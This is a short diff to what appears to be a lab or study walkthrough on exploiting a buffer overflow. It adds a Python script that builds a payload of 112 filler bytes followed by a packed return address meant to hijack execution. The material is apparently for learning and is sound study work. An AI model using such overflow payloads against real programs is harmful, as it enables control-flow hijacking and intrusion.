@@ -104,6 +104,16 @@ Identify where the buffer overflow occurs
 
 * go to ubuntu to write the buffer overflow script
 
-* 
+--- bf.py ---
+
+```
+import struct
+
+buf = "A" * 112
+buf += struct.pack("<I",0xd3adc0d3)
+
+print buf
+```
+
 
 
